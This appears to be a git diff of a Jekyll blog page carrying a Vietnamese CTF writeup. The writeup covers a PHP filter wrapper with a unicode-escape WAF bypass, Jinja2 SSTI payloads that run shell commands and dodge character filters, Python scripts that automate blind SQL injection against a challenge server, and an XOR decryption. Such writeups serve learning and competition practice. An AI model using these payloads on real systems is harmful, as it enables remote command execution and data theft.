&quot;,flag) haha +=1 if haha &lt; i: break print(&quot;Here is your flag:&quot;,flag) Flag: W1{I_th1nk_u_r_so_lite^_^} Bài 4 Differences: Flag ngay ở trong file Flag: W1{SaKur4_s0_b34uTiFuL_RI9ht?????} Bài 5 Free Flag: Đọc file pcapng ta tìm được source và key 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 import base64 BANNER = &quot;&quot;&quot; ___ __ ________ ________ ________ ________ ___ __ _____ ________ |\ \ |\ \|\ __ \|\ ___ \|\ ___ \|\ __ \|\ \ |\ \ / __ \|\ ___ \ \ \ \ \ \ \ \ \|\ \ \ \\\ \ \ \ \\\ \ \ \ \|\ \ \ \ \ \ \|\/_|\ \ \ \\\ \ \ \ \ \ __\ \ \ \ __ \ \ \\\ \ \ \ \\\ \ \ \ __ \ \ \ __\ \ \|/ \ \ \ \ \\\ \ \ \ \ \|\__\_\ \ \ \ \ \ \ \\\ \ \ \ \\\ \ \ \ \ \ \ \ \|\__\_\ \ \ \ \ \ \\\ \ \ \ \____________\ \__\ \__\ \__\\\ \__\ \__\\\ \__\ \__\ \__\ \____________\ \ \__\ \__\\\ \__\\ \|____________|\|__|\|__|\|__| \|__|\|__| \|__|\|__|\|__|\|____________| \|__|\|__| \|__| &quot;&quot;&quot; KEY = bytes.fromhex(&#39;deadbeef&#39;) def encryptSecret(secret): lst_byte = [] for i in range(len(secret)): enc_byte = ord(secret[i]) ^ KEY[i % len(KEY)] lst_byte.append(enc_byte.to_bytes(1, &#39;big&#39;)) return base64.b64encode(b&#39;&#39;.join([_ for _ in lst_byte])).decode() if __name__==&#39;__main__&#39;: print(BANNER) secret = input(&quot;&gt; Please give me your secret: &quot;) print(&quot;\n&gt; Here is your encrypted secret:&quot;, encryptSecret(secret) Decrypt lại ta sẽ có flag 1 2 3 4 5 6 7 8 9 10 11 12 13 import base64 KEY = bytes.fromhex(&#39;deadbeef&#39;) def decryptSecret(encrypted_secret): encrypted_bytes = base64.b64decode(encrypted_secret.encode()) decrypted_bytes = [encrypted_bytes[i] ^ KEY[i % len(KEY)] for i in range(len(encrypted_bytes))] decrypted_text = &#39;&#39;.join([chr(byte) for byte in decrypted_bytes]) return decrypted_text secret = &quot;iZzFsKme0oOdndOqgdnxsKmZ0KG/2o+hgdA=&quot; print(decryptSecret(secret)) Flag: W1{w3llC0mE_tO_w4nNaw1N} Mấy bài còn lại mình chưa biết làm do dark quá" />
 <link rel="canonical" href="http://localhost:4000/posts/Wannagame-Freshman/" />
 <meta property="og:url" content="http://localhost:4000/posts/Wannagame-Freshman/" />
 <meta property="og:site_name" content="Yuu’s blog" />
@@ -43,7 +43,7 @@
 <meta property="twitter:title" content="Wannagame Freshman CTF writeup" />
 <meta name="twitter:site" content="@anzuukino" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-11-11T23:00:00+07:00","datePublished":"2023-11-11T23:00:00+07:00","description":"WannaWinFreshman-Writeup Bài 1 Warmup PHP: Tóm tắt đề thì đại khái là đề bảo chúng ta phải POST data lên dưới dạng json có key là page và sau đó chương trình sẽ server sẽ decode ra và đọc file trong server Sau khi phân tích và tìm kiếm trên mạng thì mình tìm được 1 bài viếtLINK Cơ bản là json_decode nó sẽ decode luôn mã unicode thành chữ cái vì vậy mình chỉnh lại cái payload của mình từ php://filter/convert.base64-encode/resource=/flag thành \\u0070hp://filter/convert.base64-encode/resource=/flag Decode base64 và ra flag Flag: W1{w3lc0m3_w3b_w4rrj0rs} Bài 2 Namename: Bài này cho 1 đường link và không cho thêm gì khác sau khi xem source của web này thì thấy có 1 đường dẫn là /wannaw1n Sau khi đi tới đường dẫn /wannaw1n mình nhận ra ngay đây là SSTI jinja2 Payload : {{().__class__.__base__.__subclasses__()[279](&#39;ls&#39;,shell=1,stdout=-1).communicate()}} Và nó bị chặn Sau vài thử nghiệm thì có vẽ nó chặn dấu . và [] nên mình chuyển qua attr Payload mới: {{()|attr(&quot;__class__&quot;)|attr(&quot;__base__&quot;)|attr(&quot;__subclasses__&quot;)()|attr(&quot;__getitem__&quot;)(279)(&#39;ls&#39;,shell=1,stdout=-1)|attr(&#39;communicate&#39;)()}} Và nó đã hoạt động Bây giờ sửa lại payload từ ls sang cat flag.txt Và nó vẫn bị chặn cái gì đấy nên mình sử dụng cách này bypass filter (chổ này là chặn dấu . và chữ f thì phải) {{()|attr(&quot;__class__&quot;)|attr(&quot;__base__&quot;)|attr(&quot;__subclasses__&quot;)()|attr(&quot;__getitem__&quot;)(279)(&#39;cat+*&#39;,shell=1,stdout=-1)|attr(&#39;communicate&#39;)()}} Cách này sẽ đọc hết tất cả các file trong thư mục hiện tại và tìm được flag Flag: W1{U_are_master_in_SSTI} Bài 3 Solite: Bài này mình khá tiếc vì mình đọc không kỉ filter nên mình không làm được Tóm tắt đề thì bài này chỉ cho chúng ta cái page như thế này (blackbox) Sau khi đọc code và được nghe 1 số gợi ý thì mình hiểu được đây là Blind SQL Injection Nhìn kĩ source thì có 1 lỗ hổng cho chúng ta khai thác là substr không bị filter Đây là query của bài Sau một vài thử nghiệm thì mình tìm được cách để in ra tên của bảng Payload: 1&#39; and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39;),i,1) is &#39;a&#39;-- Tóm tắt : Payload này sau khi gửi lên server thì server sẽ thực hiện 1 query như sau SELECT * FROM API WHERE id LIKE &#39;%1&#39; and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39;),1,1) is &#39;a&#39;--%&#39; select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39; sẽ trả về tên của tất cả các bảng substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39;),1,1) sẽ lấy 1 ký tự a bắt đầu từ vị trí i 1&#39; and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39;),1,1) is &#39;a&#39;-- cái này sẽ so sánh ký tự mà substr vừa cắt ra nếu chính xác thì sẽ thực hiện lệnh đằng trước là SELECT * FROM API WHERE id LIKE &#39;%1&#39; và trả về cột id=1 nếu sai thì nó không thực hiện và chẳng trả về gì cả Đây là script mình tìm tên của bảng 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import string,requests from urllib.parse import quote all_characters = string.ascii_letters + string.digits + &quot;!#$%&amp;()+,-/:&lt;=&gt;?@[]^_{}&quot; url = &quot;http://45.122.249.68:20020/search?name[]=&quot; payload=&quot;1&#39; and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39;),1,1) is &#39;a&#39;--&quot; table_name = &quot;&quot; haha = 0 for i in range(1,10000): for ps in all_characters: payload =&quot;1&#39; and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%%&#39;),%d,1) is &#39;%c&#39;--&quot; %(i,ps) payload = quote(payload) urlx = url + payload #print(urlx) r=requests.get(url=urlx) if &quot;id&quot; in r.text: table_name += ps print(&quot;Table names: &quot;,table_name) haha +=1 if haha &lt; i: break print(&quot;Success all the names of the tables are:&quot;,table_name) Và tìm ra được tên của các bảng là Tables: API,flag_c1abd148_acae_40be_a953_eae333f90da0 Bây giờ dựa vào cái trên lấy ra flag từ bảng flag_c1abd148_acae_40be_a953_eae333f90da0 thôi Script của mình 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 import string,requests from urllib.parse import quote all_characters = string.ascii_letters + string.digits + &quot;!#$%&amp;()+,-/:&lt;=&gt;?@[]^_{}&quot; url = &quot;http://45.122.249.68:20020/search?name[]=&quot; table_name = &quot;flag_c1abd148_acae_40be_a953_eae333f90da0&quot; #payload = &quot;1&#39; and substr((select flag from flag_c1abd148_acae_40be_a953_eae333f90da0),1,1) is &#39;a&#39;--&quot; haha = 0 flag =&quot;&quot; for i in range(1,10000): for ps in all_characters: payload =&quot;1&#39; and substr((select flag from %s),%d,1) is &#39;%c&#39;--&quot; %(table_name,i,ps) payload = quote(payload) urlx = url + payload #print(urlx) r=requests.get(url=urlx) if &quot;id&quot; in r.text: flag += ps print(&quot;Flag is: &quot;,flag) haha +=1 if haha &lt; i: break print(&quot;Here is your flag:&quot;,flag) Flag: W1{I_th1nk_u_r_so_lite^_^} Bài 4 Differences: Flag ngay ở trong file Flag: W1{SaKur4_s0_b34uTiFuL_RI9ht?????} Bài 5 Free Flag: Đọc file pcapng ta tìm được source và key 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 import base64 BANNER = &quot;&quot;&quot; ___ __ ________ ________ ________ ________ ___ __ _____ ________ |\\ \\ |\\ \\|\\ __ \\|\\ ___ \\|\\ ___ \\|\\ __ \\|\\ \\ |\\ \\ / __ \\|\\ ___ \\ \\ \\ \\ \\ \\ \\ \\ \\|\\ \\ \\ \\\\\\ \\ \\ \\ \\\\\\ \\ \\ \\ \\|\\ \\ \\ \\ \\ \\ \\|\\/_|\\ \\ \\ \\\\\\ \\ \\ \\ \\ \\ __\\ \\ \\ \\ __ \\ \\ \\\\\\ \\ \\ \\ \\\\\\ \\ \\ \\ __ \\ \\ \\ __\\ \\ \\|/ \\ \\ \\ \\ \\\\\\ \\ \\ \\ \\ \\|\\__\\_\\ \\ \\ \\ \\ \\ \\ \\\\\\ \\ \\ \\ \\\\\\ \\ \\ \\ \\ \\ \\ \\ \\|\\__\\_\\ \\ \\ \\ \\ \\ \\\\\\ \\ \\ \\ \\____________\\ \\__\\ \\__\\ \\__\\\\\\ \\__\\ \\__\\\\\\ \\__\\ \\__\\ \\__\\ \\____________\\ \\ \\__\\ \\__\\\\\\ \\__\\\\ \\|____________|\\|__|\\|__|\\|__| \\|__|\\|__| \\|__|\\|__|\\|__|\\|____________| \\|__|\\|__| \\|__| &quot;&quot;&quot; KEY = bytes.fromhex(&#39;deadbeef&#39;) def encryptSecret(secret): lst_byte = [] for i in range(len(secret)): enc_byte = ord(secret[i]) ^ KEY[i % len(KEY)] lst_byte.append(enc_byte.to_bytes(1, &#39;big&#39;)) return base64.b64encode(b&#39;&#39;.join([_ for _ in lst_byte])).decode() if __name__==&#39;__main__&#39;: print(BANNER) secret = input(&quot;&gt; Please give me your secret: &quot;) print(&quot;\\n&gt; Here is your encrypted secret:&quot;, encryptSecret(secret) Decrypt lại ta sẽ có flag 1 2 3 4 5 6 7 8 9 10 11 12 13 import base64 KEY = bytes.fromhex(&#39;deadbeef&#39;) def decryptSecret(encrypted_secret): encrypted_bytes = base64.b64decode(encrypted_secret.encode()) decrypted_bytes = [encrypted_bytes[i] ^ KEY[i % len(KEY)] for i in range(len(encrypted_bytes))] decrypted_text = &#39;&#39;.join([chr(byte) for byte in decrypted_bytes]) return decrypted_text secret = &quot;iZzFsKme0oOdndOqgdnxsKmZ0KG/2o+hgdA=&quot; print(decryptSecret(secret)) Flag: W1{w3llC0mE_tO_w4nNaw1N} Mấy bài còn lại mình chưa biết làm do dark quá","headline":"Wannagame Freshman CTF writeup","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/Wannagame-Freshman/"},"url":"http://localhost:4000/posts/Wannagame-Freshman/"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-03-28T00:11:44+07:00","datePublished":"2023-11-11T23:00:00+07:00","description":"WannaWinFreshman-Writeup Bài 1 Warmup PHP: Tóm tắt đề thì đại khái là đề bảo chúng ta phải POST data lên dưới dạng json có key là page và sau đó chương trình sẽ server sẽ decode ra và đọc file trong server Sau khi phân tích và tìm kiếm trên mạng thì mình tìm được 1 bài viếtLINK Cơ bản là json_decode nó sẽ decode luôn mã unicode thành chữ cái vì vậy mình chỉnh lại cái payload của mình từ php://filter/convert.base64-encode/resource=/flag thành \\u0070hp://filter/convert.base64-encode/resource=/flag Decode base64 và ra flag Flag: W1{w3lc0m3_w3b_w4rrj0rs} Bài 2 Namename: Bài này cho 1 đường link và không cho thêm gì khác sau khi xem source của web này thì thấy có 1 đường dẫn là /wannaw1n Sau khi đi tới đường dẫn /wannaw1n mình nhận ra ngay đây là SSTI jinja2 Payload : {{().__class__.__base__.__subclasses__()[279](&#39;ls&#39;,shell=1,stdout=-1).communicate()}} Và nó bị chặn Sau vài thử nghiệm thì có vẽ nó chặn dấu . và [] nên mình chuyển qua |attr Payload mới: {{()|attr(&quot;__class__&quot;)|attr(&quot;__base__&quot;)|attr(&quot;__subclasses__&quot;)()|attr(&quot;__getitem__&quot;)(279)(&#39;ls&#39;,shell=1,stdout=-1)|attr(&#39;communicate&#39;)()}} Và nó đã hoạt động Bây giờ sửa lại payload từ ls sang cat flag.txt Và nó vẫn bị chặn cái gì đấy nên mình sử dụng cách này bypass filter (chổ này là chặn dấu . và chữ f thì phải) {{()|attr(&quot;__class__&quot;)|attr(&quot;__base__&quot;)|attr(&quot;__subclasses__&quot;)()|attr(&quot;__getitem__&quot;)(279)(&#39;cat+*&#39;,shell=1,stdout=-1)|attr(&#39;communicate&#39;)()}} Cách này sẽ đọc hết tất cả các file trong thư mục hiện tại và tìm được flag Flag: W1{U_are_master_in_SSTI} Bài 3 Solite: Bài này mình khá tiếc vì mình đọc không kỉ filter nên mình không làm được Tóm tắt đề thì bài này chỉ cho chúng ta cái page như thế này (blackbox) Sau khi đọc code và được nghe 1 số gợi ý thì mình hiểu được đây là Blind SQL Injection Nhìn kĩ source thì có 1 lỗ hổng cho chúng ta khai thác là substr không bị filter Đây là query của bài Sau một vài thử nghiệm thì mình tìm được cách để in ra tên của bảng Payload: 1&#39; and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39;),i,1) is &#39;a&#39;-- Tóm tắt : Payload này sau khi gửi lên server thì server sẽ thực hiện 1 query như sau SELECT * FROM API WHERE id LIKE &#39;%1&#39; and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39;),1,1) is &#39;a&#39;--%&#39; select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39; sẽ trả về tên của tất cả các bảng substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39;),1,1) sẽ lấy 1 ký tự a bắt đầu từ vị trí i 1&#39; and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39;),1,1) is &#39;a&#39;-- cái này sẽ so sánh ký tự mà substr vừa cắt ra nếu chính xác thì sẽ thực hiện lệnh đằng trước là SELECT * FROM API WHERE id LIKE &#39;%1&#39; và trả về cột id=1 nếu sai thì nó không thực hiện và chẳng trả về gì cả Đây là script mình tìm tên của bảng 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import string,requests from urllib.parse import quote all_characters = string.ascii_letters + string.digits + &quot;!#$%&amp;()+,-/:&lt;=&gt;?@[]^_{}&quot; url = &quot;http://45.122.249.68:20020/search?name[]=&quot; payload=&quot;1&#39; and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39;),1,1) is &#39;a&#39;--&quot; table_name = &quot;&quot; haha = 0 for i in range(1,10000): for ps in all_characters: payload =&quot;1&#39; and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is &#39;table&#39; and tbl_name NOT like &#39;sqlite_%%&#39;),%d,1) is &#39;%c&#39;--&quot; %(i,ps) payload = quote(payload) urlx = url + payload #print(urlx) r=requests.get(url=urlx) if &quot;id&quot; in r.text: table_name += ps print(&quot;Table names: &quot;,table_name) haha +=1 if haha &lt; i: break print(&quot;Success all the names of the tables are:&quot;,table_name) Và tìm ra được tên của các bảng là Tables: API,flag_c1abd148_acae_40be_a953_eae333f90da0 Bây giờ dựa vào cái trên lấy ra flag từ bảng flag_c1abd148_acae_40be_a953_eae333f90da0 thôi Script của mình 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 import string,requests from urllib.parse import quote all_characters = string.ascii_letters + string.digits + &quot;!#$%&amp;()+,-/:&lt;=&gt;?@[]^_{}&quot; url = &quot;http://45.122.249.68:20020/search?name[]=&quot; table_name = &quot;flag_c1abd148_acae_40be_a953_eae333f90da0&quot; #payload = &quot;1&#39; and substr((select flag from flag_c1abd148_acae_40be_a953_eae333f90da0),1,1) is &#39;a&#39;--&quot; haha = 0 flag =&quot;&quot; for i in range(1,10000): for ps in all_characters: payload =&quot;1&#39; and substr((select flag from %s),%d,1) is &#39;%c&#39;--&quot; %(table_name,i,ps) payload = quote(payload) urlx = url + payload #print(urlx) r=requests.get(url=urlx) if &quot;id&quot; in r.text: flag += ps print(&quot;Flag is: &quot;,flag) haha +=1 if haha &lt; i: break print(&quot;Here is your flag:&quot;,flag) Flag: W1{I_th1nk_u_r_so_lite^_^} Bài 4 Differences: Flag ngay ở trong file Flag: W1{SaKur4_s0_b34uTiFuL_RI9ht?????} Bài 5 Free Flag: Đọc file pcapng ta tìm được source và key 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 import base64 BANNER = &quot;&quot;&quot; ___ __ ________ ________ ________ ________ ___ __ _____ ________ |\\ \\ |\\ \\|\\ __ \\|\\ ___ \\|\\ ___ \\|\\ __ \\|\\ \\ |\\ \\ / __ \\|\\ ___ \\ \\ \\ \\ \\ \\ \\ \\ \\|\\ \\ \\ \\\\\\ \\ \\ \\ \\\\\\ \\ \\ \\ \\|\\ \\ \\ \\ \\ \\ \\|\\/_|\\ \\ \\ \\\\\\ \\ \\ \\ \\ \\ __\\ \\ \\ \\ __ \\ \\ \\\\\\ \\ \\ \\ \\\\\\ \\ \\ \\ __ \\ \\ \\ __\\ \\ \\|/ \\ \\ \\ \\ \\\\\\ \\ \\ \\ \\ \\|\\__\\_\\ \\ \\ \\ \\ \\ \\ \\\\\\ \\ \\ \\ \\\\\\ \\ \\ \\ \\ \\ \\ \\ \\|\\__\\_\\ \\ \\ \\ \\ \\ \\\\\\ \\ \\ \\ \\____________\\ \\__\\ \\__\\ \\__\\\\\\ \\__\\ \\__\\\\\\ \\__\\ \\__\\ \\__\\ \\____________\\ \\ \\__\\ \\__\\\\\\ \\__\\\\ \\|____________|\\|__|\\|__|\\|__| \\|__|\\|__| \\|__|\\|__|\\|__|\\|____________| \\|__|\\|__| \\|__| &quot;&quot;&quot; KEY = bytes.fromhex(&#39;deadbeef&#39;) def encryptSecret(secret): lst_byte = [] for i in range(len(secret)): enc_byte = ord(secret[i]) ^ KEY[i % len(KEY)] lst_byte.append(enc_byte.to_bytes(1, &#39;big&#39;)) return base64.b64encode(b&#39;&#39;.join([_ for _ in lst_byte])).decode() if __name__==&#39;__main__&#39;: print(BANNER) secret = input(&quot;&gt; Please give me your secret: &quot;) print(&quot;\\n&gt; Here is your encrypted secret:&quot;, encryptSecret(secret) Decrypt lại ta sẽ có flag 1 2 3 4 5 6 7 8 9 10 11 12 13 import base64 KEY = bytes.fromhex(&#39;deadbeef&#39;) def decryptSecret(encrypted_secret): encrypted_bytes = base64.b64decode(encrypted_secret.encode()) decrypted_bytes = [encrypted_bytes[i] ^ KEY[i % len(KEY)] for i in range(len(encrypted_bytes))] decrypted_text = &#39;&#39;.join([chr(byte) for byte in decrypted_bytes]) return decrypted_text secret = &quot;iZzFsKme0oOdndOqgdnxsKmZ0KG/2o+hgdA=&quot; print(decryptSecret(secret)) Flag: W1{w3llC0mE_tO_w4nNaw1N} Mấy bài còn lại mình chưa biết làm do dark quá","headline":"Wannagame Freshman CTF writeup","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/Wannagame-Freshman/"},"url":"http://localhost:4000/posts/Wannagame-Freshman/"}</script>
 <!-- End Jekyll SEO tag -->
 
 
@@ -1747,6 +1747,29 @@
 
       <!-- lastmod date -->
       
+        <span>
+          Updated
+          <!--
+  Date format snippet
+  See: ${JS_ROOT}/utils/locale-dateime.js
+-->
+
+
+
+
+<time
+  
+  data-ts="1711559504"
+  data-df="ll"
+  
+    data-bs-toggle="tooltip" data-bs-placement="bottom"
+  
+>
+  Mar 28, 2024
+</time>
+
+        </span>
+      
 
       
 
@@ -1798,83 +1821,76 @@
   <div class="content">
     <h1 id="wannawinfreshman-writeup">WannaWinFreshman-Writeup</h1>
 <h2 id="bài-1-warmup-php"><span class="me-2">Bài 1 Warmup PHP:</span><a href="#bài-1-warmup-php" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
-<p><a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/5a3ee0ab-9970-4e3d-bf8f-a67604534fde" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/5a3ee0ab-9970-4e3d-bf8f-a67604534fde" alt="image" loading="lazy"></a></p>
+<p><a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/71156a59-19c3-4180-be30-2b3abeb10d1d" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/71156a59-19c3-4180-be30-2b3abeb10d1d" alt="image" loading="lazy"></a></p>
 
 <ul>
   <li>Tóm tắt đề thì đại khái là đề bảo chúng ta phải POST data lên dưới dạng json có key là <strong>page</strong> và sau đó chương trình sẽ server sẽ decode ra và đọc file trong server</li>
   <li>
     <p>Sau khi phân tích và tìm kiếm trên mạng thì mình tìm được 1 bài viết<a href="https://trustfoundry.net/2018/12/20/bypassing-wafs-with-json-unicode-escape-sequences/">LINK</a>
-<a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/31c3d8aa-a577-4c52-b174-7eaa8910b281" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/31c3d8aa-a577-4c52-b174-7eaa8910b281" alt="image" loading="lazy"></a></p>
+<a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/326ec395-87d2-4be9-a7c5-4e6071dc17f0" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/326ec395-87d2-4be9-a7c5-4e6071dc17f0" alt="image" loading="lazy"></a></p>
   </li>
   <li>
     <p>Cơ bản là json_decode nó sẽ decode luôn mã unicode thành chữ cái vì vậy mình chỉnh lại cái payload của mình từ 
 <code class="language-plaintext highlighter-rouge">php://filter/convert.base64-encode/resource=/flag</code>
 thành
 <code class="language-plaintext highlighter-rouge">\u0070hp://filter/convert.base64-encode/resource=/flag</code>
-<a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/167c4651-6880-45a5-a3d8-ac155cf0de8a" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/167c4651-6880-45a5-a3d8-ac155cf0de8a" alt="image" loading="lazy"></a></p>
+<a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/92cf2e27-8845-4860-90de-d34a1cebbdfe" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/92cf2e27-8845-4860-90de-d34a1cebbdfe" alt="image" loading="lazy"></a></p>
   </li>
   <li>Decode base64 và ra flag</li>
   <li>Flag: <strong>W1{w3lc0m3_w3b_w4rrj0rs}</strong>
     <h2 id="bài-2-namename"><span class="me-2">Bài 2 Namename:</span><a href="#bài-2-namename" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
-    <p><a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/bd2e0d52-af7e-45c1-89c4-fe9600ddf55a" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/bd2e0d52-af7e-45c1-89c4-fe9600ddf55a" alt="image" loading="lazy"></a></p>
+    <p><a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/defe9e88-e3d5-414a-a13b-e3e72e7f9c19" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/defe9e88-e3d5-414a-a13b-e3e72e7f9c19" alt="image" loading="lazy"></a></p>
   </li>
   <li>
     <p>Bài này cho 1 đường link và không cho thêm gì khác sau khi xem source của web này thì thấy có 1 đường dẫn là <code class="language-plaintext highlighter-rouge">/wannaw1n</code>
-<a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/c3c2e80c-42fd-4289-8161-e206cbe83114" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/c3c2e80c-42fd-4289-8161-e206cbe83114" alt="image" loading="lazy"></a></p>
+<a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/8f8ae6bf-3d67-4503-ba1a-60d567c8ecc1" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/8f8ae6bf-3d67-4503-ba1a-60d567c8ecc1" alt="image" loading="lazy"></a></p>
   </li>
   <li>Sau khi đi tới đường dẫn /wannaw1n mình nhận ra ngay đây là SSTI jinja2</li>
   <li>Payload : <code class="language-plaintext highlighter-rouge">{{().__class__.__base__.__subclasses__()[279]('ls',shell=1,stdout=-1).communicate()}}</code></li>
   <li>
-    <p>Và nó bị chặn <a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/86841683-477b-4202-bd17-47c676c174f0" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/86841683-477b-4202-bd17-47c676c174f0" alt="image" loading="lazy"></a></p>
+    <p>Và nó bị chặn <a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/252274f5-06d8-4347-845e-6e446525d1de" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/252274f5-06d8-4347-845e-6e446525d1de" alt="image" loading="lazy"></a></p>
   </li>
   <li>
-    <div class="table-wrapper"><table>
-      <tbody>
-        <tr>
-          <td>Sau vài thử nghiệm thì có vẽ nó chặn dấu <code class="language-plaintext highlighter-rouge">.</code> và <code class="language-plaintext highlighter-rouge">[]</code> nên mình chuyển qua</td>
-          <td>attr</td>
-        </tr>
-      </tbody>
-    </table></div>
+    <p>Sau vài thử nghiệm thì có vẽ nó chặn dấu <code class="language-plaintext highlighter-rouge">.</code> và <code class="language-plaintext highlighter-rouge">[]</code> nên mình chuyển qua <code class="language-plaintext highlighter-rouge">|attr </code></p>
   </li>
   <li>Payload mới: <code class="language-plaintext highlighter-rouge">{{()|attr("__class__")|attr("__base__")|attr("__subclasses__")()|attr("__getitem__")(279)('ls',shell=1,stdout=-1)|attr('communicate')()}}</code></li>
   <li>Và nó đã hoạt động</li>
 </ul>
 
-<p><a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/52518bdf-e514-4c32-82fa-6786ff0696e1" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/52518bdf-e514-4c32-82fa-6786ff0696e1" alt="image" loading="lazy"></a></p>
+<p><a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/2aa34a0a-8783-4e3a-bfef-57e4e5f35538" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/2aa34a0a-8783-4e3a-bfef-57e4e5f35538" alt="image" loading="lazy"></a></p>
 
 <ul>
   <li>
     <p>Bây giờ sửa lại payload từ <code class="language-plaintext highlighter-rouge">ls</code> sang <code class="language-plaintext highlighter-rouge">cat flag.txt</code>
-<a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/e1b25b5d-a751-451c-aee2-9cff0ec4d02f" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/e1b25b5d-a751-451c-aee2-9cff0ec4d02f" alt="image" loading="lazy"></a></p>
+<a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/66dfde32-1efd-4d9f-9c6b-7003db035ef2" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/66dfde32-1efd-4d9f-9c6b-7003db035ef2" alt="image" loading="lazy"></a></p>
   </li>
   <li>Và nó vẫn bị chặn cái gì đấy nên mình sử dụng cách này bypass filter (chổ này là chặn dấu <code class="language-plaintext highlighter-rouge">.</code> và chữ <code class="language-plaintext highlighter-rouge">f</code> thì phải)</li>
   <li><code class="language-plaintext highlighter-rouge">{{()|attr("__class__")|attr("__base__")|attr("__subclasses__")()|attr("__getitem__")(279)('cat+*',shell=1,stdout=-1)|attr('communicate')()}}</code></li>
   <li>Cách này sẽ đọc hết tất cả các file trong thư mục hiện tại và tìm được flag</li>
 </ul>
 
-<p><a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/f5dbbef9-30f7-4d40-abfd-bc1702b2ff88" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/f5dbbef9-30f7-4d40-abfd-bc1702b2ff88" alt="image" loading="lazy"></a></p>
+<p><a href="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/eb16cde7-852a-4c5c-bb9b-55413df94330" class="popup img-link  shimmer"><img src="https://github.com/anzuukino/anzuukino.github.io/assets/86243871/eb16cde7-852a-4c5c-bb9b-55413df94330" alt="image" loading="lazy"></a></p>
 
 <ul>
   <li>Flag: <strong>W1{U_are_master_in_SSTI}</strong>
